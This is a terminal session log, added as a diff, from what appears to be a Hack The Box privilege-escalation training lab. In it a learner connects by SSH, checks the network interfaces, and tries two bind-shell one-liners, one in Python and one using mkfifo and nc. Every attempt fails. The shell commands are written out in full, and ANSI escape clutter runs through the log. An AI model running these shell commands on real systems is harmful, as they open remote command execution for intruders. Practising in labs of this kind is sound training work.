@@ -1,0 +1,66 @@
+Script started on 2024-12-27 11:43:46-05:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="190" LINES="35"]
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mscript SSH_connection_27-12-2024.log[C[C[C[C[C[C[2Pcat SSH_connection_27-12-2024.log [C[C[C[C[C[C[Clear[Kat SSH_connection_27-12-2024.log [C[C[C[C[C[Cscript SSH_connection_27-12-2024.log[C[C[C[C[C[C[2Pcat SSH_connection_27-12-2024.log [C[C[C[C[C[C[Clear[Kat SSH_connection_27-12-2024.log [C[C[C[C[C[Cscript SSH_connection_27-12-2024.log[C[C[C[C[C[C[Kssh user1[K[K[K[K[K-p48100 user1@[7m83.136.248.51:48100[27m83.136.248.51:48100[K[K[K[K[K[K
+[?2004l]0;ssh -p48100 user1@83.136.248.51 - Parrot Terminalssh: connect to host 83.136.248.51 port 48100: No route to host
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mssh -p48100 user1@83.136.248.51[K[K[K[K[K[K[K[K[K[K[K[K[K[7m83.136.248.51:48100[27m83.136.248.51:48100[K[K[K[K[K[K
+[?2004l]0;ssh -p48100 user1@83.136.248.51 - Parrot Terminalssh: connect to host 83.136.248.51 port 48100: No route to host
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[K[0;31m└──╼ [0m[01;33m$[0m[7mssh -p48100 user1@83.136.248.51[27m
+[A[C[C[C[C[C[Cssh -p48100 user1@83.136.248.51
+[A
+[?2004l]0;ssh -p48100 user1@83.136.248.51 - Parrot Terminalssh: connect to host 83.136.248.51 port 48100: No route to host
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[K[0;31m└──╼ [0m[01;33m$[0mssh -p48100 user1@83.136.248.51
+[?2004l]0;ssh -p48100 user1@83.136.248.51 - Parrot Terminal(user1@83.136.248.51) Password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Fri Dec 27 16:25:41 2024 from 10.30.18.25
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ ip a
+-bash: ip: command not found
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.11.173  netmask 255.255.255.255  broadcast 0.0.0.0
+        inet6 fe80::bc87:55ff:fe28:8c21  prefixlen 64  scopeid 0x20<link>
+        ether be:87:55:28:8c:21  txqueuelen 1000  (Ethernet)
+        RX packets 1551  bytes 131482 (131.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1431  bytes 1352393 (1.3 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 2  bytes 100 (100.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2  bytes 100 (100.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ [Kuser1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+-bash: python: command not found
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+nc: getnameinfo: Temporary failure in name resolution
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+nc: getnameinfo: Temporary failure in name resolution
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+nc: getnameinfo: Temporary failure in name resolution
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ [Kuser1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ echo ""b"o"t"h" "f"a"i"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"t"o"o"k" "s"o"m"e" "h"e"l"p" "o"n"l"i"n"e" "w"e" "d"o" "n"o"t" "n"e"e"d" "a"n" "s"s"h" "c"o"n"n"e"c"t"i"o"n" "a"n"d" "t"h"i"s" "i"s" "a" "f"a"i"l"
+took some help online we do not need an ssh connection and this is a fail
+user1@ng-1162467-gettingstartedprivesc-p8zrh-749b45bf8-h7bj7:~$ exit
+logout
+Connection to 83.136.248.51 closed.
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit
+[?2004l]0;exit - Parrot Terminalexit
+
+Script done on 2024-12-27 11:58:18-05:00 [COMMAND_EXIT_CODE="0"]
